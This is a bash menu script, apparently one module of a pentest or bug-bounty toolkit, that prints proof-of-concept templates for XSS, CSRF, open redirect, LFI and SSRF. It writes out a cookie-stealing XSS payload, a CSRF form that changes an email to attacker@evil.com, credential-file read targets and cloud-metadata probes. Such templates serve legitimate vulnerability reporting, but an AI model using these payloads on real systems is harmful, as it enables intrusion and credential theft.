#!/bin/bash
# Module: POC Methodology & Template Generator
# Goal: Standardize vulnerability demonstration

echo -e "${C6}[METHODOLOGY: PROOF_OF_CONCEPT]${NC}"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Vulnerability Type for POC Template:${NC}"
echo "1) XSS (Cross-Site Scripting)"
echo "2) CSRF (Cross-Site Request Forgery)"
echo "3) Open Redirect"
echo "4) LFI (Local File Inclusion)"
echo "5) SSRF (Server Side Request Forgery)"
echo "0) Exit"

read -p "Selection: " poc_opt

case $poc_opt in
    1)
        echo -e "\n${C2}[*] XSS PoC Template:${NC}"
        echo "1. Payload: <script>alert(document.domain)</script>"
        echo "2. Requirement: Use 'document.domain' instead of '1' to prove context."
        echo "3. Impact: Session hijacking via document.cookie (if not HttpOnly)."
        ;;
    2)
        echo -e "\n${C2}[*] CSRF HTML Auto-Submit Form:${NC}"
        echo "<html>"
        echo "  <body>"
        echo "    <form action='https://target.com/api/change-email' method='POST'>"
        echo "      <input type='hidden' name='email' value='attacker@evil.com' />"
        echo "    </form>"
        echo "    <script>document.forms[0].submit();</script>"
        echo "  </body>"
        echo "</html>"
        ;;
    3)
        echo -e "\n${C2}[*] Open Redirect PoC:${NC}"
        echo "Target URL: https://target.com/login?redirect=https://evil.com"
        echo "Demonstrate impact: 'User is redirected to a phishing site that looks like the original.'"
        ;;
    4)
        echo -e "\n${C2}[*] LFI Evidence:${NC}"
        echo "Evidence 1: Read /etc/passwd (System users)"
        echo "Evidence 2: Read /proc/self/environ (Reveals internal paths/keys)"
        echo "Evidence 3: Read web.config or settings.py (Database credentials)"
        ;;
    5)
        echo -e "\n${C2}[*] SSRF Internal Probing:${NC}"
        echo "1. Cloud Metadata: http://169.254.169.254/latest/meta-data/ (AWS/GCP)"
        echo "2. Internal Port Scan: http://127.0.0.1:6379 (Redis) or :3306 (MySQL)"
        echo "3. Impact: 'Access to internal-only services from the public internet.'"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
